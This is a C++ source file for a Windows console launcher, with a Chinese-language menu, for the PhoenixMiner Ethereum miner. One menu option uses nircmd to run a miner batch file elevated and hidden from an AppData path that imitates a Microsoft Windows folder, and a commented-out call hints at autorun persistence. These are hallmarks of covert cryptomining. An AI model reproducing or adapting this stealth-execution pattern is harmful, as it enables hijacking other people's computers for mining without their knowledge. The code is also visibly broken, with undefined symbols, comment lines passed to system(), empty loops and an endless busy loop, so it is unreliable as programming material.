#include <iostream>
#include <cstdlib>
#include <Windows.h>
#include "COIN.h"

using namespace std;

char ETHT[] = "nircmd elevatecmd exec hide\" % AppData % \Microsoft\Windows\start_miner.bat\"";

char text[] = "REM";
char text01[] = "REM Example bat file for starting PhoenixMiner.exe to mine ETH";
char text02[] = "REM";
char text03[] = "setx GPU_FORCE_64BIT_PTR 0";
char text04[] = "setx GPU_MAX_HEAP_SIZE 100";
char text05[] = "setx GPU_USE_SYNC_OBJECTS 1";
char text06[] = "setx GPU_USE_SYNC_OBJECTS 1";
char text07[] = "setx GPU_MAX_ALLOC_PERCENT 100";
char text08[] = "setx GPU_SINGLE_ALLOC_PERCENT 100";
char text09[] = "REM IMPORTANT: Replace the ETH address with your own ETH wallet address in the -wal option (Rig001 is the name of the rig)";
char text11[] = "pause";






int main()
{
	int a,b,c,i;
	char* programName = "F:\\GAME-PLAYER\\PhoenixMiner_5.5c_Windows_AMD_NVIDIA_Hidden_CMD\\PhoenixMiner_5.5c_Windows_AMD_NVIDIA_Hidden_CMD";
	HWND win = FindWindowA("ConsoleWindowClass", NULL);
	DWORD pid;
	GetWindowThreadProcessId(win, &pid);
	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (win == NULL)
	{
		cout << "程序没有运行，请打开程序或者5秒后自动打开" << endl;
	}
	else
	{
		
		cout << "检测到程序正在运行中........." << endl;
		cout << "正在唤醒菜单........." << endl;
		
		cout << "请选择您的类型" << endl;
		cout << "+++++++++++++++++++++++++++++++++++++++" << endl;
		cout << "+           1.ETH(测试1.PC002)        + " << endl;
		cout << "+           2.ETC		      +" << endl;
		cout << "+           3.开始隐藏运行程序        +" << endl;
		cout << "+           4.未开发                  +" << endl;
		cout << "+           5.未开发                  +" << endl;
		cout << "+           6.未开发                  +" << endl;
		cout << "+++++++++++++++++++++++++++++++++++++++" << endl;
		cin >> a;
		switch (a)
		{
		case 1:
			//guanbi();
			cout << "执行ETH算法-------1" << endl;
			ETH(ssl, cionname);                //char start用来接受函数ETH的message的返回值
			system(text);
			system(text01);
			system(text02);
			system(text03);
			system(text04);
			system(text05);
			system(text06);
			system(text07);
			system(text08);
			system(text09);
			system(message);
			system(text11);
			system((const char*)message);
			cout << message << endl;
			//HKRunator(programName);
			windows_run();
			break;
		case 2:
			cout << "执行ETC算法---- 2" << endl;
			system(ETC);
			cout << ETC << endl;
			break;
		case 3:
			cout << "开始隐藏运行程序" << endl;
			//WinExec(CP, SW_HIDE);
			system((const char*)ETHT);
			cout << ETHT << endl;
			break;
		case 4:
			for (b = 0; b< 8; b++)
			{
				for (c= 0; c < 8; c++)
				{
					for (i = 1; i < 8; i++)
					{

					}
				}
				cout << "控制列" << endl;
			}
		default:cout << "此参数不可用!" << endl;
			break;
		}
	}
	while(1);
	return 0;
}




